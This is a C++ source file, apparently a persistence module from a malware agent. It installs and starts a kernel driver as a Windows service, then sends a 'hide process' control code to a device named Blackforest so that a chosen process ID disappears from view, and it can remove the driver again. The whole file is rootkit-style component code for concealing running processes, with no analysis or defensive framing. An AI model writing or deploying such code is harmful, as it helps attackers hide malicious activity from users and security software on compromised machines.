#include "agent/modules/persistence/driver_loader.hpp"
#include <iostream>
#include <ios> // for std::hex

#ifndef FILE_DEVICE_UNKNOWN
#define FILE_DEVICE_UNKNOWN             0x00000022
#endif
#ifndef CTL_CODE
#define CTL_CODE( DeviceType, Function, Method, Access ) (                 \
    ((DeviceType) << 16) | ((Access) << 14) | ((Function) << 2) | (Method) \
)
#endif
#ifndef METHOD_BUFFERED
#define METHOD_BUFFERED                 0
#endif
#ifndef FILE_ANY_ACCESS
#define FILE_ANY_ACCESS                 0
#endif
#ifndef IOCTL_HIDE_PROCESS
#define IOCTL_HIDE_PROCESS CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
#endif

bool DriverLoader::LoadDriver(const std::string& driverPath, const std::string& serviceName) {
    SC_HANDLE hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (!hSCManager) return false;
    
    SC_HANDLE hService = CreateServiceA(
        hSCManager,
        serviceName.c_str(),
        serviceName.c_str(),
        SERVICE_START | DELETE | SERVICE_STOP,
        SERVICE_KERNEL_DRIVER,
        SERVICE_DEMAND_START,
        SERVICE_ERROR_IGNORE,
        driverPath.c_str(),
        NULL, NULL, NULL, NULL, NULL
    );
    
    if (!hService) {
        hService = OpenServiceA(hSCManager, serviceName.c_str(), SERVICE_START | DELETE | SERVICE_STOP);
    }
    
    if (hService) {
        StartService(hService, 0, NULL);
        CloseServiceHandle(hService);
        CloseServiceHandle(hSCManager);
        return true;
    }
    
    CloseServiceHandle(hSCManager);
    return false;
}

bool DriverLoader::HidePID(ULONG pid) {
    HANDLE hDevice = CreateFileA("\\\\.\\Blackforest", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hDevice == INVALID_HANDLE_VALUE) {
        return false;
    }
    
    DWORD bytesReturned;
    if (DeviceIoControl(hDevice, IOCTL_HIDE_PROCESS, &pid, sizeof(pid), NULL, 0, &bytesReturned, NULL)) {
        CloseHandle(hDevice);
        return true;
    }
    
    CloseHandle(hDevice);
    return false;
}

bool DriverLoader::UnloadDriver(const std::string& serviceName) {
     SC_HANDLE hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (!hSCManager) return false;
    
    SC_HANDLE hService = OpenServiceA(hSCManager, serviceName.c_str(), SERVICE_STOP | DELETE);
    if(hService) {
        SERVICE_STATUS_PROCESS ssp;
        ControlService(hService, SERVICE_CONTROL_STOP, (LPSERVICE_STATUS)&ssp);
        DeleteService(hService);
        CloseServiceHandle(hService);
    }
    CloseServiceHandle(hSCManager);
    return true;
}
